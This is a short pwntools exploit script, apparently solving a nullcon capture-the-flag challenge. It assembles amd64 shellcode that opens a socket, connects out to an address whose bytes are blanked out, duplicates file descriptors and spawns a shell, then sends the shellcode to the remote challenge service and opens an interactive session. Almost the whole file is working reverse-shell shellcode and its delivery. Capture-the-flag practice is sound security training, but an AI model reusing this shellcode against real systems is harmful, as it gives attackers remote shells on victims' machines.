#!/usr/bin/env python3
from pwn import *
context(arch='amd64')

sc = """
    /* open new socket */
    /* call socket(<AddressFamily.AF_INET: 2>, Constant('SOCK_STREAM', 0x1), 0) */
    push 41 /* 0x29 */
    pop rax
    push 2
    pop rdi
    push 1 /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    /* push b'_______]' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ _______________
    xor [rsp], rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 16) */
    push 42 /* 0x2a */
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
"""
sc += shellcraft.dupsh()

r = remote("pwn1.ctf.nullcon.net", 5002)
r.send(asm(sc))
r.interactive()
